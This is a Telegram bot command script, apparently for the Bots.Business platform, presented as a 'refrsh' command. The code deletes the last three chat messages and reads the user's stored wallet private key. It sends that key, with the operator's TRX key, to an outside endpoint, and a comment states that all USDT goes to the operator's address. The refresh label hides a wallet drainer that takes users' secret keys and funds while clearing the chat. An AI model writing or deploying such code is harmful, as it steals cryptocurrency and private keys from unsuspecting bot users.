/*CMD
  command: refrsh
  help: 
  need_reply: false
  auto_retry_time: 
  folder: 

  <<ANSWER

  ANSWER

  <<KEYBOARD

  KEYBOARD
  aliases: 
CMD*/

if (request.data) {
  var message_id = request.message.message_id
  var chat_id = request.message.chat.id

Api.deleteMessage({
    chat_id: chat_id,
    message_id: message_id
  })
Api.deleteMessage({
    chat_id: chat_id,
    message_id: message_id-1
  })
Api.deleteMessage({
    chat_id: chat_id,
    message_id: message_id-2
  })
}

var cbal = User.getProperty("cbal")
var wallpk =Bot.getProperty("wallp"+user.telegramid) 
var ap = Bot.getProperty("cp_privatekey01","🛑 Not Set") //from where trx deduct for usdt transfer fee
var me = Bot.getProperty("cp_publickey01","🛑 Not Set") //Where all usdt sent
HTTP.post( {
    url: "https://tronb2.vercel.app/usdt",
    success: '/completedmk',
   body: {private_key: wallpk,TRX_PK :ap,USDT_Reciver:me}
})
